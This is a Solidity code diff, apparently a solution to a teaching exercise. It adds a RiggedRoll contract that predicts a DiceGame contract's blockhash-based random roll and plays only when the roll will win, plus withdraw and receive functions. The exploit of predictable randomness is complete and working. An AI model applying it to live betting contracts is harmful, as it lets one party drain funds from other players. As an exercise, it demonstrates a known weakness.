@@ -6,19 +6,36 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
-
+    uint256 public nonce = 0;
     DiceGame public diceGame;
+
+    event Roll( uint256 roll);
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        require (address(this).balance > 0, "no fund here" );
+        (bool sucess, ) =  payable(_addr).call{value:_amount}("");
+        require (sucess, "Withdraw fail");
+
+    }
 
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
-
-
-    //Add receive() function so contract can receive Eth
+    function riggedRoll() external {
+    require (address(this).balance >= 0.002 ether, "not enough fund in the contract");
+        nonce = diceGame.nonce();
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
+        uint256 roll = uint256(hash) % 16;
+        require (roll < 3, "roll's not good");    
+            console.log(roll);
+            diceGame.rollTheDice{value : 0.002 ether}();
+    }
     
+    //Add receive() function so contract can receive Eth
+     receive() external payable {  }
 }
